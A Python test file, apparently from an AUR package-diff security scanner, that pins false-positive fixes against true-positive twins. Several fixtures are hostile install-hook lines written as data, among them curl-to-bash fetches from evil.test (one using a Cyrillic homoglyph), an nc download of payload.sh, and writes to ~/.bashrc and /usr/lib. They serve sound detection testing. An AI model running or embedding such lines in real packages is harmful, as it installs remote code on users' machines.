"""False-positive corrections from the 2026-10-14 watcher review.

Each test pins a rule that fired on a benign change and must not, plus the
true-positive twin so a fix that merely stops the rule firing is not mistaken
for a fix.
"""

from __future__ import annotations

import difflib
import sys
from pathlib import Path

_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_ROOT / "scripts"))

from calibration_gates import shipped_config  # noqa: E402

from trustsight.analysis import scan_diff  # noqa: E402
from trustsight.config import load_config, load_rules  # noqa: E402


def _ids(diff, current_text=None):
    with shipped_config():
        fact = scan_diff(diff, rules=load_rules(), config=load_config(),
                         package_name="p", current_text=current_text)
    return {e.rule_id for e in fact.score_breakdown}


# --- C005: a binary from the declared upstream's own host ------------------

_DECLARED = (
    "pkgname=foo-bin\n"
    'url="https://foo.example.com"\n'
    'source=("https://foo.example.com/foo.AppImage")\n'
)


def test_c005_does_not_fire_on_the_declared_upstream_host():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,3 @@\n"
            '+pkgname=foo-bin\n+url="https://foo.example.com"\n'
            '+source=("https://foo.example.com/foo.AppImage")\n')
    assert "C005" not in _ids(diff, current_text=_DECLARED)


def test_c005_still_fires_on_a_third_party_binary():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,3 @@\n"
            '+pkgname=foo-bin\n+url="https://foo.example.com"\n'
            '+source=("https://evil.test/foo.AppImage")\n')
    assert "C005" in _ids(diff, current_text=(
        'pkgname=foo-bin\nurl="https://foo.example.com"\n'
        'source=("https://evil.test/foo.AppImage")\n'))


def test_c011_does_not_fire_on_an_allow_listed_cdn():
    # foo-bin declares foo.example.com but serves from its own CDN on a
    # different registered domain, allow-listed in source_host_divergence.
    current = (
        "pkgname=foo-bin\n"
        'url="https://foo.example.com"\n'
        'source=("https://cdn.foo.example.net/foo.AppImage")\n'
    )
    with shipped_config():
        from trustsight.config import load_config as _lc
        cfg = _lc()
        cfg.setdefault("source_host_divergence", {})["allow"] = [
            "example.net"]
        fact = scan_diff(("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,3 @@\n"
                          '+pkgname=foo-bin\n+url="https://foo.example.com"\n'
                          '+source=("https://cdn.foo.example.net/foo.AppImage")\n'),
                         rules=load_rules(), config=cfg, package_name="foo-bin",
                         current_text=current)
    assert "C011" not in {e.rule_id for e in fact.score_breakdown}


# --- C004: an arch-split checksum array is not a removal -------------------

def test_c004_does_not_fire_when_the_hash_moved_to_an_arch_array():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
            "-sha256sums=('" + "a" * 64 + "')\n"
            "+sha256sums_x86_64=('" + "a" * 64 + "')\n"
            "+sha256sums_aarch64=('" + "a" * 64 + "')\n")
    current = ("pkgname=p\n"
               "sha256sums_x86_64=('" + "a" * 64 + "')\n"
               "sha256sums_aarch64=('" + "a" * 64 + "')\n")
    assert "C004" not in _ids(diff, current_text=current)


def test_c004_does_not_fire_when_the_generic_array_splits_into_arch_arrays():
    # The arch hashes differ per arch (a real per-arch tarball), so the removed
    # generic hash is genuinely gone from the recipe, yet every source is still
    # checksummed.  The moved-hash test above misses this split.
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n"
            " pkgname=p\n"
            " source=('https://example.test/x.tar.gz')\n"
            "-sha256sums=('" + "a" * 64 + "')\n"
            "+sha256sums_x86_64=('" + "b" * 64 + "')\n"
            "+sha256sums_aarch64=('" + "c" * 64 + "')\n")
    current = ("pkgname=p\n"
               "source=('https://example.test/x.tar.gz')\n"
               "sha256sums_x86_64=('" + "b" * 64 + "')\n"
               "sha256sums_aarch64=('" + "c" * 64 + "')\n")
    assert "C004" not in _ids(diff, current_text=current)


def test_c004_still_fires_on_a_genuine_checksum_removal():
    # No arch arrays, the whole checksum array gone: verification really was
    # weakened, so the refactor exemption must not swallow it.
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,2 @@\n"
            " pkgname=p\n"
            " source=('https://example.test/x.tar.gz')\n"
            "-sha256sums=('" + "a" * 64 + "')\n")
    current = ("pkgname=p\n"
               "source=('https://example.test/x.tar.gz')\n")
    assert "C004" in _ids(diff, current_text=current)


# --- C017: a hook that only prints a redirect is not a write ----------------

def test_c017_ignores_a_redirect_inside_a_hook_message():
    # The hook tells the user to append to ~/.bashrc; it writes nothing.
    diff = ("--- a/pkg.install\n+++ b/pkg.install\n@@ -0,0 +1,3 @@\n"
            "+post_install() {\n"
            "+  echo \"add 'source /usr/share/x.sh >> ~/.bashrc' to your shell\"\n"
            "+}\n")
    assert "C017" not in _ids(diff)


def test_c017_still_fires_on_an_actual_hook_write():
    diff = ("--- a/pkg.install\n+++ b/pkg.install\n@@ -0,0 +1,3 @@\n"
            "+post_install() {\n"
            "+  echo 'export PATH=/opt/x:$PATH' >> ~/.bashrc\n"
            "+}\n")
    assert "C017" in _ids(diff)


# --- Printed heredocs: body text is output, not executed shell (openxlr) ----

def _heredoc_install(line, extra="true\n"):
    return ("--- a/pkg.install\n+++ b/pkg.install\n@@ -0,0 +1,6 @@\n"
            "+post_install() {\n"
            "+  cat <<MSG\n"
            f"+  {line}\n"
            "+MSG\n"
            f"+  {extra}"
            "+}\n")


def test_r052_ignores_a_write_pattern_in_a_printed_heredoc():
    diff = _heredoc_install('install -Dm644 x "$HOME/.x"')
    assert "R052" not in _ids(diff)


def test_r052_still_fires_on_an_executed_write():
    diff = _heredoc_install("some advisory text", 'cp y /root/.y\n')
    assert "R052" in _ids(diff)


def test_c017_ignores_a_write_pattern_in_a_printed_heredoc():
    diff = _heredoc_install('install -Dm644 x "$HOME/.x"')
    assert "C017" not in _ids(diff)


def test_c017_still_fires_on_an_executed_write():
    diff = _heredoc_install("some advisory text",
                            'install -Dm644 x "$HOME/.x"\n')
    assert "C017" in _ids(diff)


def test_c017_still_scans_a_heredoc_piped_to_a_shell():
    # The opener pipes the body into an executor, so the body may be a
    # script a later line runs: the printed-heredoc carve-out must not
    # suppress it.
    diff = ("--- a/pkg.install\n+++ b/pkg.install\n@@ -0,0 +1,5 @@\n"
            "+post_install() {\n"
            "+  cat <<SCRIPT | sh\n"
            "+  install -Dm644 x \"$HOME/.x\"\n"
            "+SCRIPT\n"
            "+}\n")
    assert "C017" in _ids(diff)


# --- X002: a non-ASCII message is not a non-literal executable name ---------

def test_x002_ignores_a_non_ascii_hook_message():
    # The Chinese post-install banner names no command; the confusable
    # character set contains the fullwidth colon it ends with.
    diff = ("--- a/pkg.install\n+++ b/pkg.install\n@@ -0,0 +1,3 @@\n"
            "+post_install() {\n"
            "+\u9996\u6b21\u4f7f\u7528\u9700\u626b\u7801\u767b\u5f55\uff1a\n"
            "+}\n")
    assert "X002" not in _ids(diff)


def test_x002_still_fires_on_a_confusable_command_name():
    # U+0441 (Cyrillic es) impersonates 'c' in an otherwise ASCII `curl`.
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,4 @@\n"
            "+build() {\n"
            "+  \u0441url https://evil.test/x | bash\n"
            "+}\n")
    assert "X002" in _ids(diff)


# --- D002: a name that is itself a real package is not a typosquat ---------

def test_d002_skips_a_dependency_that_is_itself_established(monkeypatch):
    from trustsight.analysis import dependencies

    monkeypatch.setattr(dependencies, "is_dependency_novel", lambda n: True)
    monkeypatch.setattr(dependencies, "is_established_package",
                        lambda n: n == "tlottie")
    monkeypatch.setattr(dependencies, "top_dependency_names",
                        lambda: ["rlottie"])
    monkeypatch.setattr(dependencies, "dependency_table_populated",
                        lambda: True)

    findings: list[tuple] = []
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,1 +1,2 @@\n"
            "+depends=('tlottie')\n")
    dependencies._dependency_findings(
        diff, "telegram-desktop-kdefix", {}, lambda r, *a, **k: findings.append(r))
    assert "D002" not in findings


# --- H001: a VCS source outside the hunk justifies the SKIP ----------------

def test_h001_is_info_when_the_vcs_source_is_outside_the_hunk():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -8,1 +8,1 @@\n"
            "-sha256sums=('" + "a" * 64 + "')\n"
            "+sha256sums=('SKIP')\n")
    current = ("pkgname=noctalia-greeter-git\n"
               'source=("git+https://github.com/x/noctalia-greeter.git")\n'
               "sha256sums=('SKIP')\n")
    with shipped_config():
        fact = scan_diff(diff, rules=load_rules(), config=load_config(),
                         package_name="noctalia-greeter-git", current_text=current)
    entry = next(e for e in fact.score_breakdown if e.rule_id == "H001")
    assert entry.severity == "INFO"


# --- X026/X027: a refusal cannot alone cross the bar -----------------------

def test_refusal_weights_are_capped():
    from trustsight.config import load_config as _lc

    with shipped_config():
        weights = _lc()["severity_weights"]
    # X026 is MEDIUM, X027 is MEDIUM: 15 + 15 = 30 < the 35 alert bar.
    assert weights["MEDIUM"] * 2 < 35


def test_a_refusal_only_package_is_below_the_alert_bar():
    from trustsight.analysis import scan_diff
    from trustsight.full_aur.pipeline import _OVER_BENIGN_P95

    # A build() that references an assignment the tokenizer could not resolve.
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,5 @@\n"
            "+pkgname=p\n"
            "+build() {\n"
            "+  $undeclared_thing --version\n"
            "+  $other_undeclared --flag\n"
            "+}\n")
    with shipped_config():
        fact = scan_diff(diff, rules=load_rules(), config=load_config(),
                         package_name="p")
    ids = {e.rule_id for e in fact.score_breakdown}
    if "X027" in ids:
        assert fact.final_score <= _OVER_BENIGN_P95


# --- C004: a one-for-one checksum refresh on a kernel bump ------------------

def _kernel_bump_diff():
    """A kernel-bump shape: 10 sources, multiline md5sums + sha256sums, a
    local ``config`` slot whose hash changes, and one ``${pkgver}``-bearing
    URL whose line is a context line (the literal variable is unchanged)."""
    def arr(items):
        return "(\n" + "".join(f"  '{i}'\n" for i in items) + " )"

    def recipe(pkgver, config_md5, config_sha, url_md5, url_sha, extra):
        sources = ["config", "https://cdn.example/linux-${pkgver}.tar.xz"]
        sources += [f"https://cdn.example/patch-{n}.diff" for n in range(8)]
        md5 = [config_md5, url_md5] + [f"0d5{n}" for n in range(8)]
        sha = [config_sha, url_sha] + [f"1a2b{n}" for n in range(8)]
        if extra:
            sources.append("https://cdn.example/extra.diff")
            md5.append("0d5x")
            sha.append("1a2bx")
        return (
            f"pkgname=lts510\npkgver={pkgver}\n"
            f"source={arr(sources)}\n"
            f"md5sums={arr(md5)}\n"
            f"sha256sums={arr(sha)}\n"
        )

    import difflib

    old = recipe("5.10.0", "c0", "s0", "m0", "h0", extra=False)
    new = recipe("5.10.1", "c1", "s1", "m1", "h1", extra=False)
    return "\n".join(difflib.unified_diff(
        old.splitlines(), new.splitlines(),
        "a/PKGBUILD", "b/PKGBUILD", lineterm=""))


def test_c004_does_not_fire_on_a_one_for_one_checksum_refresh():
    """The versioned URL is a context line, so the added/removed URL sets
    are empty; a misclassified ``checksum_entry_removed`` there used to
    become C004.  A one-for-one replacement never shrinks the checksum
    set, so the gate stands down."""
    from trustsight.differ import extract_urls_from_diff

    diff = _kernel_bump_diff()
    assert extract_urls_from_diff(diff).checksum_behavior == \
        "checksum_added_or_changed"
    assert "C004" not in _ids(diff)


def test_c004_still_fires_when_a_checksum_array_is_genuinely_lost():
    """The true-positive twin: a checksum array deleted while the source
    URLs stay unchanged is weakened verification and must still fire."""
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,4 @@\n"
            " pkgname=demo\n pkgver=1.0\n"
            " source=('https://x.example/a.tar.gz')\n"
            "-sha256sums=('aaa')\n")
    assert "C004" in _ids(diff)


# --- Multi-line echo block: continuation lines are printed text --------------
# 2026-10-16 watcher review (audirvana-studio/audirvana-origin, score 100):
# the install hook opens `echo "` and prints several lines of guidance,
# including mkdir/redirect text. None of it executes.

_AUDIRVANA_HOOK = (
    "+post_install() {\n"
    '+echo "\n'
    "+If the configuration directory is missing:\n"
    "+mkdir -p ~/.config/audirvana\n"
    "+echo 'EulaAccepted = 1' > ~/.config/audirvana/audirvana-studio.ini\n"
    "+\n"
    "+avahi should be enabled first with: sudo systemctl enable --now avahi-daemon\n"
    '+To enable it at boot: systemctl --user enable audirvanaStudio"\n'
    "+}\n"
)


def test_a_multiline_echo_block_is_not_a_write():
    diff = ("--- a/pkg.install\n+++ b/pkg.install\n@@ -0,0 +1,9 @@\n"
            + _AUDIRVANA_HOOK)
    ids = _ids(diff)
    assert "C017" not in ids
    assert "H032" not in ids
    assert "H017" not in ids
    assert "H004" not in ids


def test_a_multiline_echo_block_does_not_hide_a_real_write():
    # The same hook shape plus one line that really writes: the write must
    # still be claimed.
    diff = ("--- a/pkg.install\n+++ b/pkg.install\n@@ -0,0 +1,6 @@\n"
            "+post_install() {\n"
            '+echo "guidance\n'
            "+mkdir -p ~/.config/audirvana\n"
            '+guidance"\n'
            "+  mkdir -p /root/.config/tool\n"
            "+}\n")
    ids = _ids(diff)
    assert "C017" in ids
    # H032 defers to X005 for the same write (one write, one finding).
    assert "H032" in ids or "X005" in ids


# --- H016: a package name must not be read as a fetch client ---------------
# 2026-10-16 watcher review (wipsync-bin): the client alternation had no
# left word boundary, so `wi-psync-` matched the `nc` client and the
# `.service` operand next to it read as a hidden download address.

def test_h016_ignores_a_client_name_inside_the_package_name():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,5 @@\n"
            " pkgname=wipsync-bin\n"
            " pkgver=1\n"
            "+package() {\n"
            '+  install -Dm644 wipsync.service "$pkgdir/usr/lib/systemd/user/wipsync.service"\n'
            "+}\n")
    assert "H016" not in _ids(diff)


def test_h016_still_fires_on_a_real_hidden_fetch():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,5 @@\n"
            " pkgname=p\n"
            " pkgver=1\n"
            "+package() {\n"
            "+  nc evil.example 9999 > payload.sh\n"
            "+}\n")
    assert "H016" in _ids(diff)


# --- Dead hooks: behavior rules stand down when install= never names the file --
# 2026-10-16 watcher review: notebook's X015 and mercure's H017 fired on
# scriptlets in shipped .install files the recipe does not wire up.  C024
# names that nit once; a hook pacman never runs schedules nothing.

_DEAD_HOOK_DIFF = (
    "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,3 @@\n"
    " pkgname=notebook\n"
    " pkgver=2\n"
    "--- a/notebook.install\n+++ b/notebook.install\n@@ -0,0 +1,3 @@\n"
    "+post_install() {\n"
    "+  systemctl --user enable --now notebook.service\n"
    "+}\n"
)


def test_x015_stands_down_in_a_hook_install_never_names():
    ids = _ids(_DEAD_HOOK_DIFF,
               current_text="pkgname=notebook\npkgver=2\n")
    assert "C024" in ids  # the undeclared hook itself is still named
    assert "X015" not in ids


def test_x015_still_fires_in_the_declared_hook():
    ids = _ids(_DEAD_HOOK_DIFF,
               current_text="pkgname=notebook\npkgver=2\n"
               "install=notebook.install\n")
    assert "X015" in ids


def test_h017_stands_down_in_a_hook_install_never_names():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,2 @@\n"
            " pkgname=mercure\n"
            " pkgver=2\n"
            "--- a/mercure.install\n+++ b/mercure.install\n@@ -0,0 +1,3 @@\n"
            "+post_install() {\n"
            "+    useradd -c Mercure -g mercure mercure\n"
            "+}\n")
    ids = _ids(diff, current_text="pkgname=mercure\npkgver=2\n")
    assert "C024" in ids
    assert "H017" not in ids


def test_h017_still_fires_in_the_declared_hook():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,2 @@\n"
            " pkgname=mercure\n"
            " pkgver=2\n"
            "--- a/mercure.install\n+++ b/mercure.install\n@@ -0,0 +1,3 @@\n"
            "+post_install() {\n"
            "+    useradd -c Mercure -g mercure mercure\n"
            "+}\n")
    ids = _ids(diff,
               current_text="pkgname=mercure\npkgver=2\ninstall=mercure.install\n")
    assert "H017" in ids


# --- septabee: setcap on the package's own binaries in a hook --------------
# 2026-10-16 watcher review: `sudo setcap cap_sys_nice=ep` on files under
# /opt/septabee is the standard realtime-audio grant, and the hook exclusion
# already keeps R059 off hook scriptlets.  H004 still claims the sudo
# itself: a privilege tool inside a root scriptlet is anomalous by
# construction and that behaviour is pinned by the keymux-era twins in
# tests/regressions/test_alert_false_positives.py - the maintainer fix is
# to drop the redundant sudo, not to suppress the rule.

def test_r059_stands_down_for_setcap_inside_a_hook():
    diff = ("--- a/pkg.install\n+++ b/pkg.install\n@@ -0,0 +1,3 @@\n"
            "+post_install() {\n"
            "+\tsudo setcap cap_sys_nice=ep '/opt/septabee/septabee'\n"
            "+}\n")
    ids = _ids(diff)
    assert "R059" not in ids
    assert "H004" in ids




# --- R058: script text inside a file-writing heredoc is not a build write ---
# 2026-10-16 watcher review (bluebubbles-desktop-app): the launcher wrapper
# is authored with `cat <<EOF > "${pkgdir}/usr/bin/..."`; the body's runtime
# `cp` to XDG_RUNTIME_DIR fired R058 as if the build wrote it.

def test_r058_ignores_a_write_inside_a_file_writing_heredoc():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,8 @@\n"
            " pkgname=p\n"
            "+package() {\n"
            '+    cat <<EOF > "${pkgdir}/usr/bin/launcher"\n'
            "+#!/usr/bin/env bash\n"
            '+_RT="${XDG_RUNTIME_DIR:-/tmp}/p-${UID}"\n'
            '+cp -f "/usr/lib/p/p" "${_RT}/p.new" && mv -f "${_RT}/p.new" "${_RT}/p"\n'
            "+exec \"${_RT}/p\"\n"
            "+EOF\n"
            "+    chmod 755 \"${pkgdir}/usr/bin/launcher\"\n"
            "+}\n")
    assert "R058" not in _ids(diff)


def test_r058_still_fires_on_a_real_build_time_write():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,4 @@\n"
            " pkgname=p\n"
            "+package() {\n"
            "+  cp evil.so /usr/lib/evil.so\n"
            "+}\n")
    assert "R058" in _ids(diff)


def test_r058_still_fires_inside_a_heredoc_piped_to_a_shell():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,6 @@\n"
            " pkgname=p\n"
            "+package() {\n"
            "+bash <<'SCRIPT'\n"
            "+cp x /usr/bin/x\n"
            "+SCRIPT\n"
            "+}\n")
    assert "R058" in _ids(diff)


# --- C016/C017 stand down in dead hooks, as H017 and X015 already do --------
# 2026-10-16 watcher review (patent-bin): a root-rc write inside
# patent-bin.install fired C017, but install= names patent.install - the
# hook never runs (C024 names that).  The live sibling (patent) keeps its
# C017.

def test_c017_stands_down_in_a_hook_install_never_names():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,3 @@\n"
            " pkgname=patent-bin\n"
            " install=patent.install\n"
            "--- a/patent-bin.install\n+++ b/patent-bin.install\n@@ -0,0 +1,3 @@\n"
            "+post_install() {\n"
            '+    echo "x" >> ~/.$(basename "$SHELL")rc\n'
            "+}\n")
    ids = _ids(diff, current_text="pkgname=patent-bin\ninstall=patent.install\n")
    assert "C024" in ids
    assert "C017" not in ids


def test_c017_still_fires_in_the_declared_hook():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,3 @@\n"
            " pkgname=patent\n"
            " install=patent.install\n"
            "--- a/patent.install\n+++ b/patent.install\n@@ -0,0 +1,3 @@\n"
            "+post_install() {\n"
            '+    echo "x" >> ~/.$(basename "$SHELL")rc\n'
            "+}\n")
    ids = _ids(diff, current_text="pkgname=patent\ninstall=patent.install\n")
    assert "C017" in ids


# --- Hardening: the dead-hook gate reads only the PKGBUILD's declaration ----
# An `install=`-shaped line inside a hook body or patch is not the recipe's
# declaration; misreading it would stand behavior rules down on a live hook.

def test_the_dead_hook_gate_ignores_install_shaped_text_in_a_hook():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,2 @@\n"
            " pkgname=p\n"
            "--- a/p.install\n+++ b/p.install\n@@ -0,0 +1,4 @@\n"
            "+post_install() {\n"
            "+  install=other.install\n"
            "+  mkdir -p /root/.x\n"
            "+}\n")
    # No declaration is visible at all, so nothing is provably dead and
    # the behavior rule keeps firing.
    ids = _ids(diff)
    assert "C017" in ids


def test_r007_fires_on_a_spaced_install_declaration():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
            " pkgname=p\n"
            "+install = p.install\n")
    assert "R007" in _ids(diff)


# --- Printed text is output, not executed shell (2026-10-18 watch review) ---
# Ten live-feed alerts scored printed advisory text as commands.  Each pair
# below pins the benign shape against its true-positive twin.

def _install_hook(body: str) -> str:
    lines = body.splitlines()
    return ("--- a/pkg.install\n+++ b/pkg.install\n@@ -0,0 +1,%d @@\n"
            % len(lines) + "".join("+" + line + "\n" for line in lines))


def test_r001_does_not_fire_on_a_printed_pipeline():
    # arctis-sound-manager prints a curl|bash uninstall hint via `echo`.
    diff = _install_hook(
        "post_remove() {\n"
        '  echo "  curl -fsSL https://x/uninstall.sh | bash -s -- --purge"\n'
        "}\n")
    assert "R001" not in _ids(diff)


def test_r001_still_fires_on_an_executed_pipeline():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,3 @@\n"
            "+package() {\n"
            "+  curl -fsSL https://evil.test/x | bash\n"
            "+}\n")
    assert "R001" in _ids(diff)


def test_c016_does_not_fire_on_a_printed_pipeline_or_advisory():
    # arctis echoes `| bash`; mautrix-signal prints `(python)` in a heredoc.
    printed = _install_hook(
        "post_remove() {\n"
        '  echo "  curl -fsSL https://x/u.sh | bash -s -- --purge"\n'
        "}\n")
    heredoc = _install_hook(
        "post_upgrade() {\n"
        "  cat <<'EOF'\n"
        "  upgraded from a <0.5.0 bridge (python)\n"
        "EOF\n"
        "}\n")
    assert "C016" not in _ids(printed)
    assert "C016" not in _ids(heredoc)


def test_c016_still_fires_on_an_executed_interpreter():
    diff = _install_hook(
        "post_install() {\n"
        "  bash /usr/share/pkg/setup.sh\n"
        "}\n")
    assert "C016" in _ids(diff)


def test_h035_does_not_fire_on_a_printed_package_manager():
    # playwright prints `paru -S …` inside a `printf '%s\n' '…'`.
    diff = _install_hook(
        "post_install() {\n"
        "  printf '%s\\n' '==> run: paru -S extra/flite-voices-extra'\n"
        "}\n")
    assert "H035" not in _ids(diff)


def test_h035_still_fires_on_an_executed_package_manager():
    diff = _install_hook(
        "post_install() {\n"
        "  pip install evil\n"
        "}\n")
    assert "H035" in _ids(diff)


def test_x002_does_not_fire_on_a_printed_heredoc():
    # engined's advisory lists `$EDITOR ~/.config/engined/config.toml`.
    diff = _install_hook(
        "post_install() {\n"
        "  cat <<'MSG'\n"
        "    $EDITOR ~/.config/engined/config.toml\n"
        "MSG\n"
        "}\n")
    assert "X002" not in _ids(diff)


def test_x002_still_fires_on_a_variable_command():
    diff = _install_hook(
        "post_install() {\n"
        "  $EDITOR /etc/passwd\n"
        "}\n")
    assert "X002" in _ids(diff)


def test_c022_does_not_fire_when_the_checksum_is_upgraded():
    # prism-harness-suite moved sha256 -> sha512.
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,4 @@\n"
            " pkgname=demo\n pkgver=1.0\n"
            "-sha256sums=('aaaa')\n"
            " sha512sums=('bbbb')\n"
            "-pkgrel=1\n+depends=('glibc')\n")
    assert "C022" not in _ids(diff)


def test_c022_still_fires_when_the_checksum_is_downgraded():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,4 @@\n"
            " pkgname=demo\n pkgver=1.0\n"
            "-sha512sums=('aaaa')\n"
            " md5sums=('bbbb')\n"
            "-pkgrel=1\n+depends=('glibc')\n")
    assert "C022" in _ids(diff)


def test_x033_does_not_fire_on_a_runtime_subcommand():
    # prism-harness-suite runs `bun run --no-install build`; `run` is a
    # bun subcommand, not a `$srcdir`-root file.
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,3 @@\n"
            "+build() {\n"
            "+  bun run --no-install build\n"
            "+}\n")
    assert "X033" not in _ids(diff)


def test_x033_still_fires_on_an_undeclared_srcdir_file():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,3 @@\n"
            "+build() {\n"
            '+  bash "$srcdir"/stage.sh\n'
            "+}\n")
    assert "X033" in _ids(diff)


# --- octave-femoctave: a `--eval` flag is not the shell `eval` --------------
# 2026-10-19 watcher review: octave-femoctave's post_install calls a wrapper
# whose body runs `octave ... --eval "$*"`.  H017's execute arm matched the
# `eval` inside the `--eval` CLI flag, so a benign packaging wrapper scored
# 40 (H017 HIGH 25 + R007 15).

def _live_hook(name: str, body: str) -> tuple[str, str]:
    lines = body.splitlines()
    diff = ("--- a/%s.install\n+++ b/%s.install\n@@ -0,0 +1,%d @@\n"
            % (name, name, len(lines))
            + "".join("+" + line + "\n" for line in lines))
    return diff, f"pkgname={name}\ninstall={name}.install\n"


def test_h017_does_not_fire_on_a_dash_eval_flag():
    diff, current = _live_hook(
        "octave-femoctave",
        "post_install() {\n"
        "  _octave_run \"$@\"\n"
        "}\n"
        "_octave_run() {\n"
        '  octave --no-history --no-init-file -q -f --eval "$*"\n'
        "}\n")
    assert "H017" not in _ids(diff, current_text=current)


def test_h017_still_fires_on_a_real_eval_builtin():
    diff, current = _live_hook(
        "octave-femoctave",
        "post_install() {\n"
        '  eval "$(octave --eval 1)"\n'
        "}\n")
    assert "H017" in _ids(diff, current_text=current)


# --- hmmer: the project's own distribution host is official -----------------
# 2026-10-19 watcher review: hmmer declares url="http://hmmer.org/" and
# serves from eddylab.org (the HMMER project's own lab host, which hmmer.org
# redirects to).  eddylab.org was unclassified, so hmmer paid the
# SOURCE_BUCKET weight (20) on a URL that is its upstream by definition.

_HMMER_HEAD = (
    "pkgname=hmmer\n"
    "pkgver=3.4\n"
    'url="https://hmmer.org/"\n'
    'source=("https://eddylab.org/software/hmmer/hmmer-3.4.tar.gz")\n'
)


def test_source_bucket_does_not_fire_on_the_projects_own_host():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -3 +3 @@\n"
            '-source=("https://mirror.example.org/hmmer-3.3.tar.gz")\n'
            '+source=("https://eddylab.org/software/hmmer/hmmer-3.4.tar.gz")\n')
    assert "SOURCE_BUCKET" not in _ids(diff, current_text=_HMMER_HEAD)


def test_source_bucket_still_fires_on_an_unknown_host():
    head = (
        "pkgname=hmmer\n"
        "pkgver=3.4\n"
        'url="https://hmmer.org/"\n'
        'source=("https://mirror.evil.test/hmmer-3.4.tar.gz")\n'
    )
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -3 +3 @@\n"
            '-source=("https://mirror.example.org/hmmer-3.3.tar.gz")\n'
            '+source=("https://mirror.evil.test/hmmer-3.4.tar.gz")\n')
    assert "SOURCE_BUCKET" in _ids(diff, current_text=head)


# --- yandex-messenger: a signed download path is not a source change --------
# 2026-10-20 watcher review: Yandex Disk mints a fresh 64-char hex path token
# per request, so a repack that changed nothing but the signed URL fired C003
# and NOVELTY every cycle.

_YANDEX_OLD = "a" * 64
_YANDEX_NEW = "b" * 64


def _yandex_diff(old: str, new: str, host: str = "downloader.disk.yandex.ru"):
    return ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -3 +3 @@\n"
            f'-source=("https://{host}/disk/{old}/yandex-messenger.deb")\n'
            f'+source=("https://{host}/disk/{new}/yandex-messenger.deb")\n')


def test_c003_does_not_fire_on_a_rotated_signed_path_token():
    current = (
        "pkgname=yandex-messenger\n"
        "pkgver=1.0\n"
        'source=("https://downloader.disk.yandex.ru/disk/'
        + _YANDEX_NEW + '/yandex-messenger.deb")\n'
    )
    assert "C003" not in _ids(_yandex_diff(_YANDEX_OLD, _YANDEX_NEW),
                              current_text=current)


def test_c003_still_fires_on_a_source_host_change():
    current = (
        "pkgname=yandex-messenger\n"
        "pkgver=1.0\n"
        'source=("https://evil.test/disk/'
        + _YANDEX_NEW + '/yandex-messenger.deb")\n'
    )
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -3 +3 @@\n"
            '-source=("https://downloader.disk.yandex.ru/disk/'
            + _YANDEX_OLD + '/yandex-messenger.deb")\n'
            '+source=("https://evil.test/disk/'
            + _YANDEX_NEW + '/yandex-messenger.deb")\n')
    assert "C003" in _ids(diff, current_text=current)


# --- qodercli-bin: the project's own Alibaba OSS bucket ---------------------

_QODER = (
    "pkgname=qodercli-bin\n"
    "pkgver=1.0\n"
    'url="https://qoder.com"\n'
    'source_x86_64=("https://qoder-ide.oss-accelerate.aliyuncs.com/'
    'new/qodercli.deb")\n'
)


def test_qoder_project_bucket_is_not_an_unknown_source():
    # A repack changes only the source line, so the declared url= is not in
    # the diff and SOURCE_BUCKET reads the official bucket, not the homepage.
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -4 +4 @@\n"
            '-source_x86_64=("https://qoder-ide.oss-accelerate.aliyuncs.com/'
            'old/qodercli.deb")\n'
            '+source_x86_64=("https://qoder-ide.oss-accelerate.aliyuncs.com/'
            'new/qodercli.deb")\n')
    ids = _ids(diff, current_text=_QODER)
    assert "SOURCE_BUCKET" not in ids
    assert "C005" not in ids
    assert "C011" not in ids
# --- H023: a bare install= declares no hook ---------------------------------
# 2026-10-21 watcher review: cargo-fframes ships `install=` with no value;
# the post-text arm read the bare assignment as a declared .install file and
# reported a hook that pacman would never run.

def test_h023_ignores_a_bare_install_assignment_in_the_diff():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,2 @@\n"
            "+pkgname=cargo-fframes\n+install=\n")
    assert "H023" not in _ids(
